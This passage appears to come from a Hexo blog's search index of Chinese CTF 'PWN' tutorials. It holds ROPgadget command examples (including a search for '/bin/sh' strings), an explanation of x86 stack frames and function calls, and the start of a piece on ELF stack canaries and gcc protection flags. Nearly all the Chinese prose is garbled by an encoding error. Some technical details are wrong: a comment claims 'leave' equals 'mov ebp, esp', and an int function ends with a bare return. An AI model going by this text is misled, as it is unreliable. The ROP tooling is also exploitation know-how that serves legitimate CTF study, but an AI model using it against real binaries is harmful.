class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--string</span> <span class="string">&quot;m..n&quot;</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤ä½¿ç”¨é€šé…ç¬¦æœç´¢åŒ…å«ä»¥<span class="string">&quot;m&quot;</span>å¼€å¤´ï¼Œæ¥ç€æ˜¯ä»»æ„å­—ç¬¦ï¼Œä»¥<span class="string">&quot;n&quot;</span>ç»“å°¾çš„å­—ç¬¦ä¸²çš„gadgetsã€‚</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--opcode</span> c9c3</span><br><span class="line">è¿™ä¸ªå‘½ä»¤æœç´¢åŒ…å«ç‰¹å®šæŒ‡ä»¤åºåˆ—<span class="number">0</span>xc9ï¼ˆleaveï¼‰å’Œ<span class="number">0</span>xc3ï¼ˆretï¼‰çš„ROP gadgetsã€‚</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--only</span> <span class="string">&quot;mov|ret&quot;</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤ä»…æœç´¢åŒ…å«movæˆ–retæŒ‡ä»¤çš„ROP gadgetsã€‚</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--only</span> <span class="string">&quot;mov|pop|xor|ret&quot;</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤ä»…æœç´¢åŒ…å«movã€popã€xoræˆ–retæŒ‡ä»¤çš„ROP gadgetsã€‚</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--filter</span> <span class="string">&quot;xchg|add|sub|cmov.*&quot;</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤æœç´¢ROP gadgetsï¼Œä½†æ’é™¤åŒ…å«xchgã€addã€subæˆ–ä»¥cmovå¼€å¤´çš„æŒ‡ä»¤çš„gadgetsã€‚</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--norop</span> <span class="literal">--nosys</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤æœç´¢gadgetsï¼Œä½†ä¸æ˜¾ç¤ºROP gadgetså’Œç³»ç»Ÿè°ƒç”¨gadgetsã€‚</span><br><span class="line"><span class="literal">--------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--range</span> <span class="number">0</span>x08041000<span class="literal">-0x08042000</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€èŒƒå›´å†…æœç´¢ROP gadgetsã€‚</span><br><span class="line"><span class="literal">------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--string</span> main <span class="literal">--range</span> <span class="number">0</span>x080c9aaa<span class="literal">-0x080c9aba</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€èŒƒå›´å†…æœç´¢åŒ…å«å­—ç¬¦ä¸²<span class="string">&quot;main&quot;</span>çš„ROP gadgetsã€‚</span><br><span class="line"><span class="literal">--------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--memstr</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤æœç´¢åœ¨å†…å­˜ä¸­èƒ½æ‰¾åˆ°å­—ç¬¦ä¸²<span class="string">&quot;/bin/sh&quot;</span>çš„ROP gadgetsã€‚</span><br><span class="line"><span class="literal">------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--console</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤å°†ROP gadgetsçš„è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚ç”ŸæˆROPé“¾æ—¶ï¼Œå¯èƒ½å¾ˆæœ‰ç”¨ã€‚</span><br><span class="line"><span class="literal">------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--badbytes</span> <span class="string">&quot;00|01-1f|7f|42&quot;</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤æœç´¢ROP gadgetsï¼Œä½†æ’é™¤åŒ…å«ç‰¹å®šå­—èŠ‚åºåˆ—çš„gadgetsï¼Œå¦‚ç©ºå­—èŠ‚ã€æ§åˆ¶å­—ç¬¦å’Œå­—èŠ‚<span class="number">0</span>x42ã€‚</span><br><span class="line"><span class="literal">------------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/Linux_lib64.so <span class="literal">--offset</span> <span class="number">0</span>xdeadbeef00000000</span><br><span class="line">è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åº“æ–‡ä»¶ä¸­æœç´¢åç§»`0xdeadbeef00000000</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-æ ˆå¸§ã€Cè¯­è¨€å‡½æ•°è°ƒç”¨</title>
      <link href="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/"/>
      <url>/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>åœ¨x86çš„è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œå†…å­˜ç©ºé—´ä¸­çš„æ ˆä¸»è¦ç”¨äºä¿å­˜<code>å‡½æ•°çš„å‚æ•°</code>ï¼Œ<code>è¿”å›å€¼</code>ï¼Œ<code>è¿”å›åœ°å€</code>ï¼Œ<code>æœ¬åœ°å˜é‡</code>ç­‰ã€‚ä¸€åˆ‡çš„å‡½æ•°è°ƒç”¨éƒ½è¦å°†ä¸åŒçš„æ•°æ®ã€åœ°å€å‹å…¥æˆ–è€…å¼¹å‡ºæ ˆã€‚å› æ­¤ï¼Œä¸ºäº†æ›´å¥½åœ°ç†è§£å‡½æ•°çš„è°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæ¥çœ‹çœ‹æ ˆæ˜¯æ€ä¹ˆå·¥ä½œçš„ã€‚</p><h2 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h2><p>æ ˆæ˜¯ä¸€ç§è®¡ç®—æœºç³»ç»Ÿä¸­çš„æ•°æ®ç»“æ„ï¼Œå®ƒæŒ‰ç…§<code>å…ˆè¿›åå‡º</code>çš„åŸåˆ™å­˜å‚¨æ•°æ®ï¼Œå…ˆè¿›å…¥çš„æ•°æ®è¢«å‹å…¥æ ˆåº•ï¼Œæœ€åçš„æ•°æ®åœ¨æ ˆé¡¶ï¼Œéœ€è¦è¯»æ•°æ®çš„æ—¶å€™ä»æ ˆé¡¶å¼€å§‹å¼¹å‡ºæ•°æ®ï¼ˆæœ€åä¸€ä¸ªæ•°æ®è¢«ç¬¬ä¸€ä¸ªè¯»å‡ºæ¥ï¼‰ã€‚<br>æ ˆçš„æ“ä½œå¸¸ç”¨æ“ä½œï¼š</p><ul><li><strong>è¿›æ ˆ</strong>ï¼ˆPUSHï¼‰ï¼šå°†ä¸€ä¸ªæ•°æ®æ”¾å…¥æ ˆé‡Œå«è¿›æ ˆï¼ˆPUSHï¼‰</li><li><strong>å‡ºæ ˆ</strong>ï¼ˆPOPï¼‰ï¼šå°†ä¸€ä¸ªæ•°æ®ä»æ ˆé‡Œå–å‡ºå«å‡ºæ ˆï¼ˆPOPï¼‰</li><li><strong>æ ˆé¡¶</strong>ï¼šå¸¸ç”¨å¯„å­˜å™¨ESPï¼ŒESPæ˜¯æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„æ ˆé¡¶ã€‚</li><li><strong>æ ˆåº•</strong>ï¼šå¸¸ç”¨å¯„å­˜å™¨EBPï¼ŒEBPæ˜¯åŸºå€æŒ‡é’ˆå¯„å­˜å™¨ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ã€‚</li></ul><p><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250922230806.png" alt="Pasted image 20250922230806"></p><blockquote><p>ä¸Šé¢ä¾‹å­ä¸­æ ˆçš„ç”Ÿé•¿æ–¹å‘æ˜¯ä»é«˜åœ°å€åˆ°ä½åœ°å€çš„ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¸‹æ–‡è®²çš„æ ˆå¸§ä¸­ï¼Œæ ˆå°±æ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼Œå› æ­¤è¿™é‡Œä¹Ÿç”¨è¿™ç§å½¢å¼çš„æ ˆã€‚popæ“ä½œåï¼Œæ ˆä¸­çš„æ•°æ®å¹¶æ²¡æœ‰è¢«æ¸…ç©ºï¼Œåªæ˜¯è¯¥æ•°æ®æˆ‘ä»¬æ— æ³•ç›´æ¥è®¿é—®ã€‚</p></blockquote><p>æœ‰äº†è¿™äº›æ ˆçš„åŸºæœ¬çŸ¥è¯†ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥æ¥çœ‹çœ‹åœ¨x86-32bitç³»ç»Ÿä¸‹ï¼ŒCè¯­è¨€å‡½æ•°æ˜¯å¦‚ä½•è°ƒç”¨çš„äº†ã€‚</p><h4 id="æ ˆå¸§"><a href="#æ ˆå¸§" class="headerlink" title="æ ˆå¸§"></a>æ ˆå¸§</h4><p>æ ˆå¸§ï¼Œä¹Ÿå°±æ˜¯stack frameï¼Œ<strong>å…¶æœ¬è´¨å°±æ˜¯ä¸€ç§æ ˆï¼Œåªæ˜¯è¿™ç§æ ˆä¸“é—¨ç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­çš„å„ç§ä¿¡æ¯ï¼ˆå‚æ•°ï¼Œè¿”å›åœ°å€ï¼Œæœ¬åœ°å˜é‡ç­‰ï¼‰ã€‚æ ˆå¸§æœ‰æ ˆé¡¶å’Œæ ˆåº•ä¹‹åˆ†ï¼Œå…¶ä¸­æ ˆé¡¶çš„åœ°å€æœ€ä½ï¼Œæ ˆåº•çš„åœ°å€æœ€é«˜ï¼ŒSP(æ ˆæŒ‡é’ˆ)å°±æ˜¯ä¸€ç›´æŒ‡å‘æ ˆé¡¶çš„</strong>ã€‚<br>åœ¨x86-32bitä¸­ï¼Œæˆ‘ä»¬ç”¨ <code>ebp</code> æŒ‡å‘æ ˆåº•ï¼Œä¹Ÿå°±æ˜¯åŸºå€æŒ‡é’ˆï¼›ç”¨ <code>esp</code> æŒ‡å‘æ ˆé¡¶ï¼Œä¹Ÿå°±æ˜¯æ ˆæŒ‡é’ˆã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ ˆå¸§çš„ç¤ºæ„å›¾ï¼š<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250923002401.png" alt="Pasted image 20250923002401"><br>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å°† <code>ebp</code> åˆ° <code>esp</code> ä¹‹é—´åŒºåŸŸå½“åš<strong>æ ˆå¸§</strong>ã€‚å¹¶ä¸æ˜¯æ•´ä¸ªæ ˆç©ºé—´åªæœ‰ä¸€ä¸ªæ ˆå¸§ï¼Œæ¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ ˆã€‚åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†è°ƒç”¨å‡½æ•°çš„å‡½æ•°ç§°ä¸ºâ€œè°ƒç”¨è€…(caller)â€ï¼Œå°†è¢«è°ƒç”¨çš„å‡½æ•°ç§°ä¸ºâ€œè¢«è°ƒç”¨è€…(callee)â€ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ</p><ol><li>â€œè°ƒç”¨è€…â€éœ€è¦çŸ¥é“åœ¨å“ªé‡Œè·å–â€œè¢«è°ƒç”¨è€…â€è¿”å›çš„å€¼ï¼›</li><li>â€œè¢«è°ƒç”¨è€…â€éœ€è¦çŸ¥é“ä¼ å…¥çš„å‚æ•°åœ¨å“ªé‡Œï¼Œ</li><li>è¿”å›çš„åœ°å€åœ¨å“ªé‡Œã€‚åŒæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯åœ¨â€œè¢«è°ƒç”¨è€…â€è¿”å›åï¼Œ<code>ebp</code>, <code>esp</code> ç­‰å¯„å­˜å™¨çš„å€¼åº”è¯¥å’Œè°ƒç”¨å‰ä¸€è‡´ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ ˆæ¥ä¿å­˜è¿™äº›æ•°æ®ã€‚<br><a href="https://gcc.godbolt.org">https://gcc.godbolt.org</a><h4 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h4>æˆ‘ä»¬ç›´æ¥é€šè¿‡å®ä¾‹æ¥çœ‹å‡½æ•°æ˜¯å¦‚ä½•è°ƒç”¨çš„ã€‚<br>è¿™æ˜¯ä¸€ä¸ªæœ‰å‚æ•°ä½†æ²¡æœ‰è°ƒç”¨ä»»ä½•å‡½æ•°çš„ç®€å•å‡½æ•°ï¼Œå®ƒè¢«å…¶ä»–å‡½æ•°è°ƒç”¨ã€‚</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">MyFunction</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b, c;</span><br><span class="line">a = <span class="number">114</span>;</span><br><span class="line">b = <span class="number">514</span>;</span><br><span class="line">c = <span class="number">19</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">2</span>, z = <span class="number">3</span>;</span><br><span class="line">MyFunction(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºè¿™æ®µä»£ç ï¼Œæ±‡ç¼–ä»£ç å¤§è‡´å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MyFunction:</span><br><span class="line"> push   ebp</span><br><span class="line"> mov    ebp, esp</span><br><span class="line"> sub    esp, <span class="number">0xc</span></span><br><span class="line"> mov    DWORD PTR [ebp<span class="number">-0x4</span>], <span class="number">0x72</span></span><br><span class="line"> mov    DWORD PTR [ebp<span class="number">-0x8</span>], <span class="number">0x202</span></span><br><span class="line"> mov    DWORD PTR [ebp<span class="number">-0xc</span>], <span class="number">0x13</span></span><br><span class="line"> leave</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line"> push   ebp</span><br><span class="line"> mov    ebp, esp</span><br><span class="line"> sub    esp, <span class="number">0xc</span></span><br><span class="line"> mov    DWORD PTR [ebp<span class="number">-0x4</span>], <span class="number">0x1</span></span><br><span class="line"> mov    DWORD PTR [ebp<span class="number">-0x8</span>], <span class="number">0x2</span></span><br><span class="line"> mov    DWORD PTR [ebp<span class="number">-0xc</span>], <span class="number">0x3</span></span><br><span class="line"> push   <span class="number">0x3</span></span><br><span class="line"> push   <span class="number">0x2</span></span><br><span class="line"> push   <span class="number">0x1</span></span><br><span class="line"> call   MyFunction</span><br><span class="line"> xor    eax, eax</span><br><span class="line"> leave</span><br><span class="line"> ret</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è°ƒç”¨å‡½æ•°æ—¶ï¼Œç”¨ <code>call</code> æŒ‡ä»¤ï¼š<br><code>call MyFunction</code><br>ç­‰ä»·äºï¼š</p><ol><li><strong>push eip_next</strong> ï¼ˆæŠŠâ€œcall ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€â€å‹æ ˆï¼Œå°±æ˜¯ä¸‹å›¾ä¸­çš„<code>è¿”å›åœ°å€</code>ï¼Œè¿˜è®°å¾—å—ï¼Œ<code>eip/rip</code>ä¿å­˜ä¸‹ä¸€æ¡æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ï¼‰</li><li><strong>jmp MyFunction</strong> ï¼ˆè·³è½¬åˆ°å‡½æ•°å…¥å£ï¼‰<br>æ‰€ä»¥æ ˆé¡¶ä¿å­˜äº†â€œå‡½æ•°æ‰§è¡Œå®Œåè¯¥å›åˆ°å“ªé‡Œâ€çš„åœ°å€ã€‚<br>æ¥ç€æ˜¯<code>MyFunction</code>å¼€å¤´çš„ <code>push ebp</code> ; <code>mov  ebp, esp</code><br>å…‰çœ‹ä»£ç å¯èƒ½è¿˜æ˜¯ä¸å¤ªæ˜ç™½ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ­¤æ—¶çš„æ ˆæ˜¯ä»€ä¹ˆæ ·çš„ï¼š<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250923002450.png" alt="Pasted image 20250923002450">æ­¤æ—¶è°ƒç”¨è€…åšäº†ä¸¤ä»¶äº‹æƒ…ï¼š</li><li>å°†è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°æŒ‰ç…§ä»å³åˆ°å·¦çš„é¡ºåºå‹å…¥æ ˆä¸­ã€‚</li><li>å°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­ã€‚è¿™ä¸¤ä»¶äº‹éƒ½æ˜¯è°ƒç”¨è€…è´Ÿè´£çš„ï¼Œå› æ­¤å‹å…¥çš„æ ˆåº”è¯¥å±äºè°ƒç”¨è€…çš„æ ˆå¸§ã€‚<br>æˆ‘ä»¬å†æ¥çœ‹çœ‹<strong>è¢«è°ƒç”¨è€…</strong>ï¼Œå®ƒä¹Ÿåšäº†ä¸¤ä»¶äº‹æƒ…ï¼š</li><li>å°†è€çš„ï¼ˆè°ƒç”¨è€…çš„ï¼‰ <code>ebp</code> å‹å…¥æ ˆï¼Œæ­¤æ—¶ <code>esp</code> æŒ‡å‘å®ƒã€‚</li><li>å°† <code>esp</code> çš„å€¼èµ‹ç»™ <code>ebp</code>, <code>ebp</code> å°±æœ‰äº†æ–°çš„å€¼ï¼Œå®ƒä¹ŸæŒ‡å‘å­˜æ”¾è€ <code>ebp</code> çš„æ ˆç©ºé—´ã€‚è¿™æ—¶ï¼Œå®ƒæˆäº†æ˜¯å‡½æ•° <code>MyFunction()</code> æ ˆå¸§çš„æ ˆåº•ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä¿å­˜äº†â€œè°ƒç”¨è€…â€å‡½æ•°çš„ <code>ebp</code>ï¼Œå¹¶ä¸”å»ºç«‹äº†ä¸€ä¸ªæ–°çš„æ ˆå¸§ã€‚<br>åªè¦è¿™æ­¥å¼„æ˜ç™½äº†ï¼Œä¸‹é¢çš„æ“ä½œå°±å¥½ç†è§£äº†ã€‚åœ¨ <code>ebp</code> æ›´æ–°åï¼Œæˆ‘ä»¬å…ˆåˆ†é…ä¸€å—0xcå­—èŠ‚çš„ç©ºé—´ç”¨äºå­˜æ”¾æœ¬åœ°å˜é‡ï¼Œè¿™æ­¥ç”¨ <code>sub</code> æŒ‡ä»¤å®ç°ã€‚é€šè¿‡ä½¿ç”¨ <code>movè½¬ç§»æŒ‡ä»¤</code> é…åˆ <code>å­—èŠ‚æ•° ptr [offset]</code> æˆ‘ä»¬ä¾¿å¯ä»¥ç»™ <code>a</code>, <code>b</code> å’Œ <code>c</code> èµ‹å€¼äº†ã€‚<br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250923002920.png" alt="Pasted image 20250923002920"><h4 id="å‡½æ•°è¿”å›"><a href="#å‡½æ•°è¿”å›" class="headerlink" title="å‡½æ•°è¿”å›"></a>å‡½æ•°è¿”å›</h4>ä¸Šé¢è®²çš„éƒ½æ˜¯å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬ç°åœ¨æ¥çœ‹çœ‹å‡½æ•°æ˜¯å¦‚ä½•è¿”å›çš„ã€‚ä»ä¸‹é¢è¿™ä¸ªä¾‹å­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå’Œè°ƒç”¨å‡½æ•°æ—¶æ­£å¥½ç›¸åã€‚å½“å‡½æ•°å®Œæˆè‡ªå·±çš„ä»»åŠ¡åï¼Œå®ƒä¼šå°† <code>esp</code> ç§»åˆ° <code>ebp</code> å¤„ï¼Œç„¶åå†å¼¹å‡ºæ—§çš„ <code>ebp</code> çš„å€¼åˆ° <code>ebp</code>ã€‚è¿™æ ·ï¼Œ<code>ebp</code> å°±æ¢å¤åˆ°äº†å‡½æ•°è°ƒç”¨å‰çš„çŠ¶æ€äº†ã€‚<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave ;//ç­‰åŒäºmov ebp, esp ; pop ebp</span><br><span class="line">ret ;//ç­‰åŒäºpop eip;</span><br></pre></td></tr></table></figure><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250923003918.png" alt="Pasted image 20250923003918"><br>æœ€åä¸€æ­¥<code>ret ;//ç­‰åŒäºpop eip;</code> ä½¿<code>eip</code>çš„å€¼ä¸º<code>è¿”å›åœ°å€</code></li></ol><blockquote><p>call call back:<br><code>eip/rip</code>ä¿å­˜ä¸‹ä¸€æ¡æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€<br><code>è¿”å›åœ°å€</code>å­˜çš„æ˜¯æ˜¯è°ƒç”¨è€…callè¢«è°ƒç”¨è€…çš„æŒ‡ä»¤çš„ä¸‹ä¸€æ¡</p></blockquote><p><strong>äºæ˜¯ç¨‹åºå›åˆ°ä¸Šä¸€ä¸ªå‡½æ•°æ¥ç€è¿è¡Œä¸‹å»ï¼Œç›´è‡³æ•´ä¸ªç¨‹åºè¿è¡Œå®Œã€‚</strong></p><h2 id="å®è§‚ä¸€ä¾‹"><a href="#å®è§‚ä¸€ä¾‹" class="headerlink" title="å®è§‚ä¸€ä¾‹"></a>å®è§‚ä¸€ä¾‹</h2><p><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207201642.png" alt="Pasted image 20250207201642"><br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207201650.png" alt="Pasted image 20250207201650"><br><img src="/2025/02/07/PWN%E5%9F%BA%E7%A1%80-%E6%A0%88%E5%B8%A7%E3%80%81C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/Pasted image 20250207185644.png" alt="Pasted image 20250207185644"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶</title>
      <link href="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>Linux ELFæ–‡ä»¶çš„ä¿æŠ¤ä¸»è¦æœ‰å››ç§ï¼šCanaryã€NXã€PIEã€RELRO</p><h2 id="1-Canary"><a href="#1-Canary" class="headerlink" title="1.Canary"></a>1.Canary</h2><p><strong>StackCanaryè¡¨ç¤ºæ ˆçš„æŠ¥è­¦ä¿æŠ¤</strong>ã€‚<br>åœ¨å‡½æ•°è¿”å›å€¼ä¹‹å‰æ·»åŠ çš„ä¸€ä¸²éšæœºæ•°ï¼ˆä¸è¶…è¿‡æœºå™¨å­—é•¿ï¼‰ï¼ˆä¹Ÿå«åšcookieï¼‰ï¼Œæœ«ä½ä¸º/x00ï¼ˆæä¾›äº†è¦†ç›–æœ€åä¸€å­—èŠ‚è¾“å‡ºæ³„éœ²Canaryçš„å¯èƒ½ï¼‰ï¼Œå¦‚æœå‡ºç°ç¼“å†²åŒºæº¢å‡ºæ”»<br>å‡»ï¼Œè¦†ç›–å†…å®¹è¦†ç›–åˆ°Canaryå¤„ï¼Œå°±ä¼šæ”¹å˜åŸæœ¬è¯¥å¤„çš„æ•°å€¼ï¼Œ<em>å½“ç¨‹åºæ‰§è¡Œåˆ°æ­¤å¤„æ—¶ï¼Œä¼šæ£€æŸ¥Canaryå€¼æ˜¯å¦è·Ÿå¼€å§‹çš„å€¼ä¸€æ ·ï¼Œå¦‚æœä¸ä¸€æ ·ï¼Œç¨‹åºä¼šå´©æºƒï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤è¿”å›åœ°å€çš„ç›®çš„ã€‚</em><br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250214194346.png" alt="Pasted image 20250214194346"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//GCCç”¨æ³•</span></span><br><span class="line">gcc -o test test.c <span class="comment">// é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯Canaryä¿æŠ¤</span></span><br><span class="line">gcc -fno-<span class="built_in">stack</span>-protector -o test test.c <span class="comment">//ç¦ç”¨æ ˆä¿æŠ¤</span></span><br><span class="line">gcc -fstack-protector -o test test.c <span class="comment">//å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span></span><br><span class="line">gcc -fstack-protector-all -o test test.c <span class="comment">//å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span></span><br><span class="line">-fno-<span class="built_in">stack</span>-protector /-fstack-protector / -fstack-protector-all (å…³é—­ / å¼€å¯ / å…¨å¼€å¯)</span><br></pre></td></tr></table></figure><h2 